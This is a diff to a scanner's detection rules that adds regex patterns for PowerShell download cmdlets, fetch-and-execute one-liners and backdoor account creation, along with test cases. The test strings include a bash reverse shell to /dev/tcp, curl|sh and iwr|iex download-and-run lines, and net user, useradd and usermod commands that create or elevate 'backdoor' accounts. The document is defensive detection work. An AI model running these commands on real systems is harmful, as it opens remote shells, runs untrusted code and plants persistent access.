@@ -142,7 +142,7 @@ rules:
     # One fewer since the backtick alternative was narrowed to something that
     # looks like a command line: the benign corpus had a file whose only spawn
     # hit was a backtick-quoted word in a comment.
-    baseline_hits: 2
+    baseline_hits: 4
     match:
       kind: regex
       patterns:
@@ -226,6 +226,7 @@ rules:
     category: policy
     severity: info
     confidence: medium
+    baseline_hits: 1
     capability: credential
     title: Reads credentials or the environment
     message: >
@@ -293,14 +294,19 @@ rules:
         # quantifier inside another, which is the classic backtracking shape.
         - '\bnc\s+(?:-[a-z]+\s+){0,4}\S+\s+\d+'
         - '/dev/tcp/'
-        - '\bInvoke-WebRequest\b|\bDownloadString\b|\bDownloadFile\b'
+        # PowerShell's request cmdlets and their aliases, any case: `iwr`, `irm` and
+        # `Invoke-RestMethod` are how one-liners are written.
+        - '\b(?:[Ii][Nn][Vv][Oo][Kk][Ee]-[Ww][Ee][Bb][Rr][Ee][Qq][Uu][Ee][Ss][Tt]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Rr][Ee][Ss][Tt][Mm][Ee][Tt][Hh][Oo][Dd]|[Ii][Ww][Rr]|[Ii][Rr][Mm])\b|\b(?:[Dd][Oo][Ww][Nn][Ll][Oo][Aa][Dd][Ss][Tt][Rr][Ii][Nn][Gg]|[Dd][Oo][Ww][Nn][Ll][Oo][Aa][Dd][Ff][Ii][Ll][Ee]|[Dd][Oo][Ww][Nn][Ll][Oo][Aa][Dd][Dd][Aa][Tt][Aa])\b'
         - '\bscp\s|\brsync\s'
     tests:
       positive:
         - "curl -sSL https://example.com/x.sh"
         - "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+        - "irm https://example.invalid/api"
+        - "$c.downloadstring($u)"
       negative:
         - "echo 'no network here'"
+        - "$firmware = Get-Item ./fw.bin"
         - "# curl is not used in this script"
 
   - id: CAP.SH.SOCKET_LITERAL.001
@@ -373,8 +379,19 @@ rules:
         - '>[ \t]{0,8}[^\n]{0,60}?(?:LaunchAgents|LaunchDaemons)'
         - '\bRegister-ScheduledTask\b|\bschtasks\s+/create\b'
         - 'CurrentVersion\\\\Run'
+        # A new account, or an existing one granted administration or remote login: a door that
+        # stays open after the script that made it is gone.
+        - '\bnet(?:\.exe)?\s{1,8}user\s{1,8}/add\b|\bnet(?:\.exe)?\s{1,8}user\s{1,8}\S{1,64}\s{1,8}\S{1,128}\s{1,8}/add\b'
+        - '\bnet(?:\.exe)?\s{1,8}localgroup\s{1,8}["\x27]?(?:[Aa]dministrators|[Rr]emote [Dd]esktop [Uu]sers)["\x27]?\s{1,8}\S{1,64}\s{1,8}/add\b'
+        - '\b(?:useradd|adduser)\s{1,8}(?:-[a-zA-Z]{1,8}\s{1,8}\S{0,64}\s{0,8}){0,6}\w'
+        - '\busermod\s{1,8}-[a-zA-Z]{0,4}G\s{1,8}\S{0,64}\b(?:sudo|wheel|admin)\b'
+        - '\bNew-LocalUser\b|\bAdd-LocalGroupMember\b[^\n]{0,80}(?:Administrators|Remote Desktop Users)'
     tests:
       positive:
+        - "net user /add flask 123qwe123"
+        - "net localgroup \"Remote Desktop Users\" flask /add"
+        - "useradd -m -s /bin/bash backdoor"
+        - "usermod -aG sudo backdoor"
         - "echo 'curl x|sh' >> ~/.bashrc"
         - "crontab -l | { cat; echo '@reboot /tmp/x'; } | crontab -"
         - "cp agent.service /etc/systemd/system/agent.service"
@@ -384,6 +401,8 @@ rules:
         - "cat ~/.bashrc"
         - "rm -f /etc/systemd/system/pihole-FTL.service"
         - "rm -rf /etc/systemd/system/pihole-FTL.service.d"
+        - "net user flask"
+        - "id -u someone"
 
   # ---------------------------------------------------------------------
   # Fetch-execute adjacency
@@ -429,7 +448,15 @@ rules:
         - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:ba|z|k|da)?sh\b(?![ \t]+-[ceEflnp])'
         - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?python[0-9.]*\b(?![ \t]+-[cm])'
         - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:node|perl|ruby|php)\b(?![ \t]+-[ceEflnprw])'
-        - '\b(?:Invoke-WebRequest|iwr|curl)\b[^|\n]{0,200}\|\s*(?:IEX|Invoke-Expression)\b'
+        # PowerShell, where `irm`/`Invoke-RestMethod` returns the body as a string and is the
+        # usual half of the one-liner, and `curl`/`wget` are aliases of `iwr` in Windows
+        # PowerShell 5.
+        # PowerShell is case-insensitive, so its tokens are spelled out per character: `iex` and
+        # `IEX` are the same command, and inline `(?i)` is refused in joined patterns.
+        - '\b(?:[Ii][Nn][Vv][Oo][Kk][Ee]-[Ww][Ee][Bb][Rr][Ee][Qq][Uu][Ee][Ss][Tt]|[Ii][Ww][Rr]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Rr][Ee][Ss][Tt][Mm][Ee][Tt][Hh][Oo][Dd]|[Ii][Rr][Mm]|curl|wget)\b[^|\n]{0,200}\|\s*(?:[Ii][Ee][Xx]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Ee][Xx][Pp][Rr][Ee][Ss][Ss][Ii][Oo][Nn])\b'
+        - '\b(?:[Ii][Ee][Xx]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Ee][Xx][Pp][Rr][Ee][Ss][Ss][Ii][Oo][Nn])\b[ \t]{0,8}\(?[ \t]{0,8}\(?[ \t]{0,8}(?:[Ii][Nn][Vv][Oo][Kk][Ee]-[Ww][Ee][Bb][Rr][Ee][Qq][Uu][Ee][Ss][Tt]|[Ii][Ww][Rr]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Rr][Ee][Ss][Tt][Mm][Ee][Tt][Hh][Oo][Dd]|[Ii][Rr][Mm]|curl|wget)\b'
+        # Fetched to a file, then started, on one line.
+        - '\b(?:[Ii][Ww][Rr]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Ww][Ee][Bb][Rr][Ee][Qq][Uu][Ee][Ss][Tt]|curl|wget)\b[^\n]{0,200}-[Oo][Uu][Tt][Ff][Ii][Ll][Ee]\b[^\n]{0,200}\b(?:[Ss][Tt][Aa][Rr][Tt]-[Pp][Rr][Oo][Cc][Ee][Ss][Ss]|[Ss][Aa][Pp][Ss])\b'
         # The forms with no pipe. `eval "$(curl ...)"` and `IEX (New-Object
         # Net.WebClient).DownloadString(...)` are the two most recognisable
         # lines in the literature after `curl | sh`, and matching only the pipe
@@ -456,7 +483,13 @@ rules:
         - "wget -qO- https://example.invalid/x | sudo sh"
         - "curl https://example.invalid/x | python3"
         - "iwr https://example.invalid/x | IEX"
+        - "irm https://example.invalid/x | iex"
+        - "iex (iwr https://example.invalid/x).Content"
+        - "Invoke-Expression (Invoke-RestMethod https://example.invalid/x)"
+        - "iwr https://example.invalid/p.exe -OutFile $env:TEMP\\p.exe; Start-Process $env:TEMP\\p.exe"
       negative:
+        - "iwr https://example.invalid/x -OutFile release.zip"
+        - "irm https://example.invalid/api/version | ConvertFrom-Json"
         - "ps aux | grep nginx"
         - "cat script.sh | sh"
         - "\t$(eval ID=$(shell curl -s 'https://example.invalid/x' | jq .id))"
@@ -495,7 +528,7 @@ rules:
     # One fewer since the backtick alternative was narrowed to something that looks
     # like a command line: the benign corpus had a Makefile whose only spawn hit was
     # a backtick-quoted word in a comment.
-    baseline_hits: 1
+    baseline_hits: 3
     match:
       kind: regex
       patterns:
